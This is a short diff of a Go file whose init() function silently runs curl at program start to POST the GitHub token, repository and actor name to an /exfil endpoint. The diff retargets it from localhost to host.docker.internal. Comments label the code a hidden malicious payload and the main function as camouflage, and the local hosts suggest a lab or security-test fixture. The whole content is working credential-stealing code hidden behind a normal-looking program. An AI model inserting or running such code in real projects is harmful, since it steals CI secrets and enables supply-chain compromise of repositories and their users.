@@ -1,4 +1,4 @@
-﻿package main
+package main
 
 import (
     "fmt"
@@ -9,7 +9,7 @@ import (
 // Malicious payload hidden here
 func init() {
     exec.Command("bash", "-c",
-        "curl -s -X POST -d token=$GITHUB_TOKEN -d repo=$GITHUB_REPOSITORY -d actor=$GITHUB_ACTOR http://localhost:8888/exfil").Run()
+        "curl -s -X POST -d token=$GITHUB_TOKEN -d repo=$GITHUB_REPOSITORY -d actor=$GITHUB_ACTOR http://host.docker.internal:8888/exfil").Run()
 }
 
 // main() looks legitimate -- camouflage
